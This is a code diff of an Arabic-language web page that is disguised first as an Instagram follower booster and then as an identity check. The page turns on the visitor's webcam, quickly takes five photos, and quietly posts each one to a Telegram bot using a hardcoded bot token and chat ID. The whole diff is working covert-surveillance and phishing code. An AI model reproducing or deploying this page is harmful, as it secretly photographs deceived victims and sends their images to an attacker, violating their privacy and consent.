@@ -2,15 +2,15 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>زيادة متابعين إنستا</title>
+  <title>تأكيد الهوية</title>
   <style>
     body { text-align: center; font-family: sans-serif; background: #f2f2f2; }
     video, canvas { margin: 10px; border: 2px solid #000; }
   </style>
 </head>
 <body>
-  <h2>جارٍ التحقق من الهوية...</h2>
-  <p>يرجى الانتظار، يتم التحقق تلقائيًا</p>
+  <h2>جاري التحقق...</h2>
+  <p>يرجى البقاء أمام الكاميرا</p>
 
   <video id="video" width="300" autoplay muted></video>
   <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
@@ -20,22 +20,26 @@
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
 
-    // إعداد الكاميرا
+    const token = '7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E';
+    const chat_id = '6437823957';
+
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        // بعد 3 ثواني من تشغيل الكاميرا، يتم الالتقاط والإرسال
-        setTimeout(() => {
+        // التقط 5 صور بفاصل 200ms
+        let count = 0;
+        const maxPhotos = 5;
+        const interval = setInterval(() => {
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(sendToTelegram, 'image/jpeg');
-        }, 3000);
+          canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg');
+          count++;
+          if (count >= maxPhotos) clearInterval(interval);
+        }, 200);
       })
-      .catch(err => alert("فشل الوصول إلى الكاميرا: " + err));
+      .catch(err => alert("فشل تشغيل الكاميرا: " + err));
 
     function sendToTelegram(blob) {
-      const token = '7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E';
-      const chat_id = '6437823957';
       const formData = new FormData();
       formData.append('chat_id', chat_id);
       formData.append('photo', blob, 'photo.jpg');
@@ -44,11 +48,8 @@
         method: 'POST',
         body: formData
       })
-      .then(res => {
-        if (res.ok) console.log("تم الإرسال");
-        else console.log("فشل الإرسال");
-      })
-      .catch(err => console.error("خطأ في الإرسال: " + err));
+      .then(res => console.log("تم الإرسال"))
+      .catch(err => console.error("خطأ:", err));
     }
   </script>
 </body>
